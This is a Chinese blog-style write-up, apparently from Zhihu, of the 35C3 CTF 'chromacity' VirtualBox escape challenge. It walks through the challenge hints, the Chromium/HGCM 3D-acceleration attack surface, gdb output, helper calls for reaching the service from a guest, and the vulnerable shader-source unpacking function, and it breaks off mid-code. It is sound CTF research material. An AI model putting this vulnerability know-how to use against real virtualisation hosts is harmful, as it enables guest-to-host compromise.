&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e05fb9386d014f04628ac1a470d56f82_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者:&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/1147d134e271d3e7428150977892bb51&quot; data-hash=&quot;1147d134e271d3e7428150977892bb51&quot; data-hovercard=&quot;p$b$1147d134e271d3e7428150977892bb51&quot;&gt;@flyyy&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;b&gt;长亭科技安全研究员，曾获得GeekPwn 2018“最佳技术奖”，入选极棒名人堂。&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;35C3CTF中niklasb出了一道关于virtualbox逃逸的0day题目，想从这个题目给大家介绍virtualbox的一个新的攻击面（其实类似的攻击面也同样存在于其他虚拟化类软件），这里记录一下和@kelwin一起解题的过程（被dalao带飞真爽）&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;题目描述&lt;/b&gt;&lt;/h2&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;chromacity 477
Solves: 2
Please escape VirtualBox. 3D acceleration is enabled for your convenience.
​
No need to analyze the 6.0 patches, they should not contain security fixes.
​
Once you&#39;re done, submit your exploit at https://vms.35c3ctf.ccc.ac/, but assume that all passwords are different on the remote setup.
​
Challenge files. Password for the encrypted VM image is the flag for &quot;sanity check&quot;.
​
Setup
​
UPDATE: You might need to enable nested virtualization.
​
Hint: https://github.com/niklasb/3dpwn/ might be useful
​
Hint 2: this photo was taken earlier today at C3
​
Difficulty estimate: hard
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    题目描述中可以看出：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;虚拟机配置中显卡开启了3D加速功能&lt;/li&gt;&lt;li&gt;6.0的patch没用，参考virtualbox 6.0的发布时间推测是出题人来不及用最新版适配环境等等，所以是一道0day题目&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;    题目前前后后给出了四个附件，一个是img文件，一个是通过qemu+kvm虚拟机运行该img的.sh文件，这个虚拟机就是远程运行的host的环境，host当中有一个5.28 release版的virtualbox，也就是我们逃逸的目标。（算上启动host环境中的virtualbox，如果你的主机是windows+vmware workstation的话。。。满眼都是泪），另外还有两张图片，一张是关于目标virtualbox虚拟机的配置，一张是niklasb和他电脑屏幕的照片。电脑屏幕上显示的是&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//www.khronos.org/registry/OpenGL-Refpages/gl4/html/glShaderSource.xhtml&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这个页面&lt;/a&gt;，看样子题目应该跟glShaderSource这个opengl的api有关。&lt;/p&gt;&lt;p&gt;    同时给出的两个hint，一个是niklasb自己关于3dpwn的github链接，其中有他之前通过攻击virtual box 3D加速模块实现逃逸的源码和相关&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//phoenhex.re/2018-07-27/better-slow-than-sorry&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;分析文章&lt;/a&gt;。另一个就是附件中关于niklasb的照片。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;题目分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    通过题目描述我们可以比较确定的是出题人希望我们去找virtualbox 3D加速部分的0day漏洞来实现逃逸，同时通过他给出的github链接中的文章和题目名我们可以很快把目标锁定在3D加速部分的&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//chromium.sourceforge.net/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Chromium&lt;/a&gt;代码上（并不是同名的浏览器项目）。&lt;/p&gt;&lt;p&gt;    简单来说，virtualbox通过引入OpenGL的共享库来引入3D加速功能，而Chromium负责解析Virtualbox。Chromium定义了一套用来描述OpenGL不同操作的网络协议。但是这个Chromium库最后一次更新源码已经是在十二年前了。同时通过这个库我们大概可以猜到之前hint中那张照片的用意了。如果排除掉去直接挖掘OpenGL的0day的可能性，那Virtualbox代码中关于glShaderSource的部分就只有Chromium中关于这个api的协议解析的部分了。而恰好niklasb的github中的源码和文章都是关于Chromium部分的漏洞及其利用的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;源码分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    Virtualbox的Guest additions类似于VMware workstation中的vmware-tools。不同的地方在于，VMware workstation通过暴漏固定的端口给guest来实现guest与host的通信，而Guest additions是通过增加一个自定义的虚拟硬件vboxguest来实现guest与host的交互。而3D加速是作为一个virtualbox自定义的hgcm服务进程存在的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;gdb-peda$ i thread
  Id   Target Id         Frame 
* 1    Thread 0x7fe77f6d9780 (LWP 14933) &quot;VirtualBoxVM&quot; 0x00007fe77b0acbf9 in __GI___poll (fds=0x55fe988e82b0, nfds=0x2, timeout=0x63) at ../sysdeps/unix/sysv/linux/poll.c:29
......
  15   Thread 0x7fe72f86a700 (LWP 14965) &quot;ShCrOpenGL&quot; 0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x7fe720004068)
......
  35   Thread 0x7fe6d0cd6700 (LWP 14985) &quot;nspr-3&quot; 0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x55fe9868ed70)
    at ../sysdeps/unix/sysv/linux/futex-internal.h:88
  36   Thread 0x7fe6b9b61700 (LWP 14986) &quot;SHCLIP&quot; 0x00007fe77b0acbf9 in __GI___poll (fds=0x7fe6b4000b20, nfds=0x2, timeout=0xffffffff) at ../sysdeps/unix/sysv/linux/poll.c:29
gdb-peda$ thread 15
[Switching to thread 15 (Thread 0x7fe72f86a700 (LWP 14965))]
#0  0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
88  ../sysdeps/unix/sysv/linux/futex-internal.h: No such file or directory.
gdb-peda$ bt
#0  0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
#1  __pthread_cond_wait_common (abstime=0x0, mutex=0x7fe720004070, cond=0x7fe720004040) at pthread_cond_wait.c:502
#2  __pthread_cond_wait (cond=0x7fe720004040, mutex=0x7fe720004070) at pthread_cond_wait.c:655
#3  0x00007fe77e0e5cc8 in rtSemEventWait (fAutoResume=0x1, cMillies=0xffffffff, hEventSem=0x7fe720004040)
    at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:369
#4  RTSemEventWait (hEventSem=0x7fe720004040, cMillies=0xffffffff) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:482
#5  0x00007fe75d3b09aa in HGCMThread::MsgGet (this=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:549
#6  0x00007fe75d3b147f in hgcmMsgGet (pThread=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:734
#7  0x00007fe75d3b265c in hgcmServiceThread (pThread=0x7fe720003f60, pvUser=0x7fe720003e00) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:608
#8  0x00007fe75d3af940 in hgcmWorkerThreadFunc (hThreadSelf=0x7fe720004340, pvUser=0x7fe720003f60) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200
#9  0x00007fe77df95501 in rtThreadMain (pThread=0x7fe720004340, NativeThread=0x7fe72f86a700, pszThreadName=0x7fe720004c20 &quot;ShCrOpenGL&quot;)
    at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719
#10 0x00007fe77e0df882 in rtThreadNativeMain (pvArgs=0x7fe720004340) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/posix/thread-posix.cpp:327
#11 0x00007fe77a48f6db in start_thread (arg=0x7fe72f86a700) at pthread_create.c:463
#12 0x00007fe77b0b988f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
​
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    也就是说，当我们想要在guest中想要调用一个OpenGL的某个接口，需要根据我们的请求先进行Chromium的协议封装，再进行hgcm的协议封装。具体关于virtualbox在这两部分的实现细节，请阅读virtualbox相关源码，这里不再详述。&lt;/p&gt;&lt;p&gt;    niklasb在其github上已经封装好了调用Chromium代码部分的函数及例子,比如下面这两行代码：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;)
hgcm_call(client, SHCRGL_GUEST_FN_SET_VERSION, [9, 1])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    最终在源码中会触发到src/vbox/hostservices/sharedopengl/crservice/crservice.cpp中的switch下的SHCRGL_GUEST_FN_SET_VERSION部分，其中的vMajor和vMinor会分别为9和1。         &lt;/p&gt;&lt;p&gt;    再次回到题目上来，题目已经提醒了漏洞存在的位置可能在Chromium中glShaderSource相关的接口位置，通过在源码中的寻找与分析，我们把目标锁定在了crUnpackExtendShaderSource函数中。crUnpackExtendShaderSource代码如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crUnpackExtendShaderSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hasNonLocalLen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT32_MAX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;crError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crUnpackExtendShaderSource: count %u is out of range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasNonLocalLen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DATA_POINTER_CHECK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;crError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INT32_MAX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DATA_POINTER_CHECK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;crError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span 